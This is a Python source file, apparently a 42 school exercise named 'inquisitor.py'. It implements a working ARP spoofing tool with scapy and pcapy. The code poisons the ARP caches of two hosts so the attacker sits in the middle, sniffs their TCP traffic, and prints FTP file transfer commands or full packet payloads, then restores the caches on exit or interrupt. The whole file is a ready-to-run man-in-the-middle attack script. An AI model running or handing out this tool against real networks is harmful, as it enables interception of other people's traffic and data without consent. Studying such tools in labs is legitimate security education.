#!/usr/bin/env python3
# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    inquisitor.py                                      :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: lguisado <lguisado@student.42.fr>          +#+  +:+       +#+         #
#        cherrero <cherrero@student.42.fr>        +#+#+#+#+#+   +#+            #
#    Created: 2023/05/24 13:30:26 by lguisado          #+#    #+#              #
#    Updated: 2023/05/28 22:45:16 by lguisado         ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

import time
import pcapy
import struct
import argparse
import warnings
import scapy.all as scapy
from dpkt.ethernet import Ethernet

src_ip = ''
src_mac = ''
trg_ip = ''
trg_mac = ''
atk_mac = ''
verbose = False

def parse_args():
	parser = argparse.ArgumentParser(description="ARP spoofing tool")
	parser.add_argument("-is", "--ip-source", type=str, help="ip source")
	parser.add_argument("-ms", "--mac-source", type=str, help="mac source")
	parser.add_argument("-it", "--ip-target", type=str, help="ip target")
	parser.add_argument("-mt", "--mac-target", type=str, help="mac target")
	parser.add_argument("-ma", "--mac-attack", type=str, help="mac attack")
	parser.add_argument("-v", "--verbose", nargs='?',default=0, help="increase output verbosity")
	args = parser.parse_args()
	return args

def spoof(target_ip, host_ip, target_mac):
	"""
	Spoofs `target_ip` saying that we are `host_ip`.
	it is accomplished by changing the ARP cache of the target (poisoning)
	"""
	# craft the arp 'is-at' operation packet, in other words; an ARP response
	# we don't specify 'hwsrc' (source MAC address)
	# because by default, 'hwsrc' is the real MAC address of the sender (ours)
	arp_response = scapy.ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
	# send the packet
	# verbose = 0 means that we send the packet without printing any thing
	scapy.send(arp_response, verbose=0)
	if verbose == True:
		# get the MAC address of the default interface we are using
		self_mac = scapy.ARP().hwsrc
		print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))

def restore(target_ip, host_ip):
	"""
	Restores the normal process of a regular network
	This is done by sending the original informations 
	(real IP and MAC of `host_ip` ) to `target_ip`
	"""
	# crafting the restoring packet
	arp_response = scapy.ARP(pdst=target_ip, hwdst=trg_mac, psrc=host_ip, hwsrc=src_mac, op="is-at")
	# sending the restoring packet
	# to restore the network to its normal process
	# we send each reply seven times for a good measure (count=7)
	scapy.send(arp_response, verbose=0, count=7)
	if verbose == True:
		print("[+] Sent to {} : {} is-at {}".format(trg_ip, src_ip, src_mac))
	
def process_packet(header, data):
	# Ethernet header
	eth_header = data[:14]
	eth_header_values = struct.unpack("!6s6sH", eth_header)
	destination_mac = ":".join("{:02x}".format(b) for b in eth_header_values[0])
	
	ip_header = data[14:34]
	ip_header_values = struct.unpack("!BBHHHBBH4s4s", ip_header)
	source_ip = ".".join(str(b) for b in ip_header_values[8])
	destination_ip = ".".join(str(b) for b in ip_header_values[9])
	eth = Ethernet(data)
	ip = eth.data
	try:
		payload = ip.data.data
	except AttributeError:
		payload = None
	if str(payload).startswith("b'STOR") and 'end' in str(payload):
		print("[!] Restoring the network, please wait...")
		restore(trg_ip, src_ip)
		restore(src_ip, trg_ip)
		exit(0)
	if destination_mac == atk_mac:
		if verbose == True:
				if payload: 
					print("{} -> {}: {}".format(source_ip, destination_ip, str(payload).strip("b'\\r\\n")))
		else:
			if str(payload).startswith("b'STOR") or str(payload).startswith("b'RETR"):
				print (str(payload).strip("b'\\r\\nSTORRETR"))

def pcap_sniff():
	interface = 'eth0'
	capture = pcapy.open_live(interface, 65536, True, 1000)
	capture.setfilter('tcp')
	print("sniffing")
	while True:
		warnings.filterwarnings("ignore", category=DeprecationWarning)
		header, data = capture.next()
		process_packet(header, data)

def main():
	global src_ip, src_mac, trg_ip, trg_mac, atk_mac, verbose
	args = parse_args()
	if args.verbose is None:
		verbose = True
	if args.ip_source and args.mac_source and args.ip_target and args.mac_target:
		src_ip = args.ip_source
		src_mac = args.mac_source
		trg_ip = args.ip_target
		trg_mac = args.mac_target
		atk_mac = args.mac_attack
	else:
		print("[!] You must specify all the arguments")
		exit(0)
	try:
		# telling the `target` that we are the `host`
		spoof(trg_ip, src_ip, trg_mac)
		# telling the `host` that we are the `target`
		spoof(src_ip, trg_ip, src_mac)
		# sleep for one second
		time.sleep(1)
		# sniffing()
		pcap_sniff()
	except KeyboardInterrupt:
		print("[!] Detected CTRL+C ! restoring the network, please wait...")
		restore(trg_ip, src_ip)
		restore(src_ip, trg_ip)

if __name__ == "__main__":
	main()
